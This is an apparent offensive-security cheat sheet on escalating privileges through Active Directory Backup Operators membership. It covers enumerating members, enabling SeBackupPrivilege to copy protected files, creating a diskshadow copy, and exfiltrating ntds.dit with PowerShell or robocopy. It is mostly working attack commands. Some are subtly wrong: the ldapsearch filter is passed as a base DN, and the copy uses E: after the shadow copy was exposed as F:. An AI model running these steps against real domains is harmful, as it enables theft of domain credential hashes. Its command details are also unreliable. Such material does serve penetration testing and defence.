# Privilege Escalation using Backup Operators AD group privileges

## Privilege Escalation using Backup Operators AD group privileges [t-ad-privileged_groups-backup_operators]

As with Server Operators membership, we can access DCs file system if we belong to Backup Operators.
This is because this group grants its members the SeBackup and SeRestore privileges. 
The SeBackupPrivilege allows us to traverse any folder and list the folder contents. 
This will let us copy a file from a folder, even if nothing else is giving you permissions. 
However, to abuse this permissions to copy a file the flag FILE_FLAG_BACKUP_SEMANTICS **** must be used. 
Therefore, special tools are needed.
 


### 1.1 Enumerate users in privileged AD groups.




**option 1: powershell_ad_module**

{% code overflow="wrap" %}
```bash

Get-ADGroupMember -Identity "Backup Operators" -Recursive

```
{% endcode %}

{% hint style="info" %}You can add "| Measure-Object" to the powershell command to get a total number of the accounts

{% endhint %}


**option 2: bloodhound**

{% code overflow="wrap" %}
```bash
MATCH (u:User)-[:MemberOf]->(g:Group {name:'BACKUP OPERATORS@DOMAIN.COM'}) return u.name, u.displayname

```
{% endcode %}

{% hint style="info" %}domain groups and the domain name should be in uppercase

{% endhint %}


**option 3: ldapsearch**

{% code overflow="wrap" %}
```bash
ldapsearch -x ldap://<dc_ip> -D "<user@domain.com>" -w '<password>' -b "DC=<domain,DC=com>" -b "(memberOf:1.2.840.113556.1.4.1941:=cn=Backup Operators,cn=Users,dc=hpbank,dc=local)" sAMAccountName | grep sAMAccountName

```
{% endcode %}

### 1.2 Local Attack



{% code overflow="wrap" %}
```bash
# Import libraries
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege # ...or whoami /priv | findstr Backup SeBackupPrivilege is disabled

# Enable SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege

# List Admin folder for example and steal a file
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\\report.pdf c:\temp\x.pdf -Overwrite

```
{% endcode %}

### 1.3 AD Attack - Directly access the Domain Controller file system



{% code overflow="wrap" %}
```bash
dir \\dc01\C$
```
{% endcode %}

### 1.4 Steal Local NTDS



{% code overflow="wrap" %}
```bash
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% F:
DISKSHADOW> end backup
DISKSHADOW> exit

```
{% endcode %}

### 1.5 As in the local attack, you can now copy the privileged file




**option 1: SeBackupPrivilege Powershell Scripts**

{% code overflow="wrap" %}
```bash
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
{% endcode %}


**option 2: robocopy**

{% code overflow="wrap" %}
```bash
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
{% endcode %}

{% hint style="info" %}An MS Tool

{% endhint %}

